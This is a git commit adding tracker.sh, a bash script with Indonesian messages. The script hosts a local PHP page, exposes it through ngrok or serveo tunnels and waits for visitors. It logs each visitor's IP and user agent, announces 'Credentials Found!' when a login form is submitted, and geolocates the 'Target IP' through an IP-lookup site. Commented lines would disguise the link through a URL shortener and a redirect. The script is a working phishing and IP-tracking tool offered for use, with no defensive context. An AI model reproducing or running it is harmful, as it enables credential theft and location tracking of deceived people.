98024079eae8eb12872a6d6bb2ec6b7817877ba6
xmont <64508275+xmont@users.noreply.github.com>
2020-05-02 00:42:13 +0700

    Create tracker.sh

---
+++ tracker.sh
@@ -0,0 +1,340 @@
+#!/bin/bash
+
+trap 'printf "\n";stop;exit 1' 2
+
+
+dependencies() {
+
+command -v php > /dev/null 2>&1 || { echo >&2 "I require php but it's not installed. Install it. Aborting."; exit 1; }
+command -v curl > /dev/null 2>&1 || { echo >&2 "I require curl but it's not installed. Install it. Aborting."; exit 1; }
+
+}
+
+menu() {
+
+#echo -e "Server"
+#echo -e "1. Ngrok"
+#echo -e "2. Serveo"
+   
+#read -p $'\n\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Pilih salah satu \e[0m' option
+
+
+#if [[ $option == 1 || $option == 01 ]]; then
+server="ip"
+start1
+
+#elif [[ $option == 2 || $option == 02 ]]; then
+#server="ip"
+#startx
+
+#else
+#printf "\e[1;93m [!] Invalid option!\e[0m\n"
+#sleep 1
+#clear
+#menu
+#fi
+}
+
+stop() {
+
+checkngrok=$(ps aux | grep -o "ngrok" | head -n1)
+checkphp=$(ps aux | grep -o "php" | head -n1)
+checkssh=$(ps aux | grep -o "ssh" | head -n1)
+if [[ $checkngrok == *'ngrok'* ]]; then
+pkill -f -2 ngrok > /dev/null 2>&1
+killall -2 ngrok > /dev/null 2>&1
+fi
+if [[ $checkphp == *'php'* ]]; then
+pkill -f -2 php > /dev/null 2>&1
+killall -2 php > /dev/null 2>&1
+fi
+if [[ $checkssh == *'ssh'* ]]; then
+pkill -f -2 ssh > /dev/null 2>&1
+killall ssh > /dev/null 2>&1
+fi
+if [[ -e sendlink ]]; then
+rm -rf sendlink
+fi
+
+}
+
+load() {
+echo -e "\n"
+bar=" ...................................................."
+barlength=${#bar}
+i=0
+while((i<100)); do
+n=$((i*barlength / 100))
+printf "\e[00;32\r[%-${barlength}s\e[00m" "${bar:0:n}"
+((i +=RANDOM%5+2))
+sleep 0.01
+done
+}
+
+banner() {
+
+  echo -e "    \e[1;31m   &&    &&"
+  sleep 0.03
+  echo -e "       &&    &&"
+  sleep 0.03
+  echo -e "      \e[1;31m  &&  &&                   \e[1;37m                 %@"
+  sleep 0.0
+  echo -e "      \e[1;31m   &&&&     @&$  @%&    &@@\e[1;37m&æ    &@&æêë    &%@"
+  sleep 0.03
+  echo -e "    \e[1;31m    &&  &&   @$  @&  @$  @& \e[1;37m  &@  &@    &&  @# %$&@%#"
+  sleep 0.03
+  echo -e "     \e[1;31m  &&    && @$       &@ &@   \e[1;37m  @%æ&@    @& &@  &@"
+  sleep 0.03
+  echo -e "     \e[1;31m  &&    &@&@P       ææP  @\e[1;37m&&ΩP   &@    @$&%   %#@&%$"
+  sleep 0.03
+  echo -e " X-MONT"
+  sleep 0.03  
+}
+
+start1() {
+if [[ -e sendlink ]]; then
+rm -rf sendlink
+fi
+
+
+#printf "\n"
+#printf "\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;93m Serveo.net (SSH Tunneling, Best!)\e[0m\n"
+#printf "\e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;93m Ngrok\e[0m\n"
+#default_option_server="1"
+#read -p $'\n\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Choose a Port Forwarding option: \e[0m' option_server
+#option_server="${option_server:-${default_option_server}}"
+#if [[ $option_server == 1 || $option_server == 01 ]]; then
+#startx
+
+#elif [[ $option_server == 2 || $option_server == 02 ]]; then
+start2
+#else
+#printf "\e[1;93m [!] Invalid option!\e[0m\n"
+#sleep 1
+#clear
+#start1
+#fi
+
+}
+
+start2() {
+if [[ -e sites/$server/ip.txt ]]; then
+rm -rf sites/$server/ip.txt
+
+fi
+if [[ -e sites/$server/usernames.txt ]]; then
+rm -rf sites/$server/usernames.txt
+
+fi
+
+
+if [[ -e ngrok ]]; then
+echo ""
+else
+command -v unzip > /dev/null 2>&1 || { echo >&2 "unzip belum di install. Aborting."; exit 1; }
+command -v wget > /dev/null 2>&1 || { echo >&2 ". wget belum diinstall. Aborting."; exit 1; }
+printf "\e[1;92m[\e[0m*\e[1;92m] Downloa Ngrok...\n"
+arch=$(uname -a | grep -o 'arm' | head -n1)
+arch2=$(uname -a | grep -o 'Android' | head -n1)
+if [[ $arch == *'arm'* ]] || [[ $arch2 == *'Android'* ]] ; then
+wget --no-check-certificate https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip > /dev/null 2>&1
+
+if [[ -e ngrok-stable-linux-arm.zip ]]; then
+unzip ngrok-stable-linux-arm.zip > /dev/null 2>&1
+chmod +x ngrok
+rm -rf ngrok-stable-linux-arm.zip
+else
+printf "\e[1;93m[!] Download error... Termux, run:\e[0m\e[1;77m pkg install wget\e[0m\n"
+exit 1
+fi
+
+else
+wget --no-check-certificate https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-386.zip > /dev/null 2>&1 
+if [[ -e ngrok-stable-linux-386.zip ]]; then
+unzip ngrok-stable-linux-386.zip > /dev/null 2>&1
+chmod +x ngrok
+rm -rf ngrok-stable-linux-386.zip
+else
+printf "\e[1;93m[!] Download error... \e[0m\n"
+exit 1
+fi
+fi
+fi
+
+printf "\e[1;92m\e[0m*\e[1;92m Memulai php server...\n"
+cd sites/$server && php -S 127.0.0.1:3333 > /dev/null 2>&1 & 
+#cd /home/xmontftp && php -S 127.0.0.1:21 > /dev/null 2>&1 & 
+sleep 2
+printf "\e[1;92m\e[0m*\e[1;92m Memulai ngrok server...\n"
+./ngrok http 127.0.0.1:3333 > /dev/null 2>&1 &
+#./ngrok http 127.0.0.1:21 > /dev/null 2>&1 &
+sleep 10
+
+link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
+printf "\e[1;92m[\e[0m*\e[1;92m] link Forwading:\e[0m\e[1;77m %s\e[0m\n" $link
+#send_ip=$(curl -s "http://tinyurl.com/api-create.php?url=https://www.youtube.com/redirect?v=636B9Qh-fqU&redir_token=j8GGFy4s0H5jIRVfuChglne9fQB8MTU4MjM5MzM0N0AxNTgyMzA2OTQ3&event=video_description&q=$link" | head -n1)
+#send_ip=$(curl -s http://tinyurl.com/api-create.php?url=$send_link | head -n1)
+#printf '\n\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Or using tinyurl:\e[0m\e[1;77m %s \n' $send_ip
+printf "\n"
+
+checkfound
+}
+
+checkfound() {
+
+printf "\n"
+printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Tunggu aja ! iya Tunggu,\e[0m\e[1;77m tekan Ctrl + C kalo udah bosen idup...\e[0m\n"
+while [ true ]; do
+
+
+if [[ -e "sites/$server/ip.txt" ]]; then
+printf "\n\e[1;92m[\e[0m*\e[1;92m] IP Found!\n"
+catch_ip
+rm -rf sites/$server/ip.txt
+fi
+sleep 0.5
+if [[ -e "sites/$server/usernames.txt" ]]; then
+printf "\n\e[1;93m[\e[0m*\e[1;93m]\e[0m\e[1;92m Credentials Found!\n"
+#catch_cred
+#rm -rf sites/$server/usernames.txt
+fi
+sleep 0.5
+
+done
+
+}
+
+catch_ip() {
+touch sites/$server/saved.usernames.txt
+ip=$(grep -a 'IP:' sites/$server/ip.txt | cut -d " " -f2 | tr -d '\r')
+IFS=$'\n'
+ua=$(grep 'User-Agent:' sites/$server/ip.txt | cut -d '"' -f2)
+printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Target IP:\e[0m\e[1;77m %s\e[0m\n" $ip
+printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] User-Agent:\e[0m\e[1;77m %s\e[0m\n" $ua
+printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Saved:\e[0m\e[1;77m %s/saved.ip.txt\e[0m\n" $server
+cat sites/$server/ip.txt >> sites/$server/saved.ip.txt
+
+if [[ -e iptracker.log ]]; then
+rm -rf iptracker.log
+fi
+
+IFS='\n'
+iptracker=$(curl -s -L "www.ip-tracker.org/locator/ip-lookup.php?ip=$ip" --user-agent "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31" > iptracker.log)
+IFS=$'\n'
+continent=$(grep -o 'Continent.*' iptracker.log | head -n1 | cut -d ">" -f3 | cut -d "<" -f1)
+printf "\n"
+hostnameip=$(grep  -o "</td></tr><tr><th>Hostname:.*" iptracker.log | cut -d "<" -f7 | cut -d ">" -f2)
+if [[ $hostnameip != "" ]]; then
+printf "\e[1;92m[*] Hostname:\e[0m\e[1;77m %s\e[0m\n" $hostnameip
+fi
+##
+
+reverse_dns=$(grep -a "</td></tr><tr><th>Hostname:.*" iptracker.log | cut -d "<" -f1)
+if [[ $reverse_dns != "" ]]; then
+printf "\e[1;92m[*] Reverse DNS:\e[0m\e[1;77m %s\e[0m\n" $reverse_dns
+fi
+##
+
+
+if [[ $continent != "" ]]; then
+printf "\e[1;92m[*] IP Continent:\e[0m\e[1;77m %s\e[0m\n" $continent
+fi
+##
+
+country=$(grep -o 'Country:.*' iptracker.log | cut -d ">" -f3 | cut -d "&" -f1)
+if [[ $country != "" ]]; then
+printf "\e[1;92m[*] IP Country:\e[0m\e[1;77m %s\e[0m\n" $country
+fi
+##
+
+state=$(grep -o "tracking lessimpt.*" iptracker.log | cut -d "<" -f1 | cut -d ">" -f2)
+if [[ $state != "" ]]; then
+printf "\e[1;92m[*] State:\e[0m\e[1;77m %s\e[0m\n" $state
+fi
+##
+city=$(grep -o "City Location:.*" iptracker.log | cut -d "<" -f3 | cut -d ">" -f2)
+
+if [[ $city != "" ]]; then
+printf "\e[1;92m[*] City Location:\e[0m\e[1;77m %s\e[0m\n" $city
+fi
+##
+
+isp=$(grep -o "ISP:.*" iptracker.log | cut -d "<" -f3 | cut -d ">" -f2)
+if [[ $isp != "" ]]; then
+printf "\e[1;92m[*] ISP:\e[0m\e[1;77m %s\e[0m\n" $isp
+fi
+##
+
+as_number=$(grep -o "AS Number:.*" iptracker.log | cut -d "<" -f3 | cut -d ">" -f2)
+if [[ $as_number != "" ]]; then
+printf "\e[1;92m[*] AS Number:\e[0m\e[1;77m %s\e[0m\n" $as_number
+fi
+##
+
+ip_speed=$(grep -o "IP Address Speed:.*" iptracker.log | cut -d "<" -f3 | cut -d ">" -f2)
+if [[ $ip_speed != "" ]]; then
+printf "\e[1;92m[*] IP Address Speed:\e[0m\e[1;77m %s\e[0m\n" $ip_speed
+fi
+##
+ip_currency=$(grep -o "IP Currency:.*" iptracker.log | cut -d "<" -f3 | cut -d ">" -f2)
+
+if [[ $ip_currency != "" ]]; then
+printf "\e[1;92m[*] IP Currency:\e[0m\e[1;77m %s\e[0m\n" $ip_currency
+fi
+##
+printf "\n"
+rm -rf iptracker.log
+printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Waiting Credentials and Next IP, Press Ctrl + C to exit...\e[0m\n"
+
+}
+
+
+
+serverx() {
+printf "\e[1;92m[\e[0m*\e[1;92m] Memulai php server...\n"
+cd sites/$server && php -S 127.0.0.1:$port > /dev/null 2>&1 & 
+sleep 2
+printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Memulai server...\e[0m\n"
+command -v ssh > /dev/null 2>&1 || { echo >&2 "I require SSH but it's not installed. Install it. Aborting."; exit 1; }
+if [[ -e sendlink ]]; then
+rm -rf sendlink
+fi
+$(which sh) -c 'ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R 80:localhost:'$port' serveo.net 2> /dev/null > sendlink ' &
+printf "\n"
+sleep 10
+send_link=$(grep -o "https://[0-9a-z]*\.serveo.net" sendlink)
+printf "\n"
+printf '\n\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] link forwading :\e[0m\e[1;77m %s \n' $send_link
+
+#send_ip=$(curl -s "http://tinyurl.com/api-create.php?url=https://www.youtube.com/redirect?v=636B9Qh-fqU&redir_token=j8GGFy4s0H5jIRVfuChglne9fQB8MTU4MjM5MzM0N0AxNTgyMzA2OTQ3&event=video_description&q=$send_link" | head -n1)
+#send_ip=$(curl -s http://tinyurl.com/api-create.php?url=$send_link | head -n1)
+#rintf '\n\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Or using tinyurl:\e[0m\e[1;77m %s \n' $send_ip
+#printf "\n"
+checkfound
+
+
+}
+
+startx() {
+if [[ -e sites/$server/ip.txt ]]; then
+rm -rf sites/$server/ip.txt
+
+fi
+if [[ -e sites/$server/usernames.txt ]]; then
+rm -rf sites/$server/usernames.txt
+
+fi
+
+default_port="3000" #$(seq 1111 4444 | sort -R | head -n1)
+printf '\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Choose a Port (Default:\e[0m\e[1;77m %s \e[0m\e[1;92m): \e[0m' $default_port
+read port
+port="${port:-${default_port}}"
+serverx
+
+}
+
+
+banner
+dependencies
+menu
+
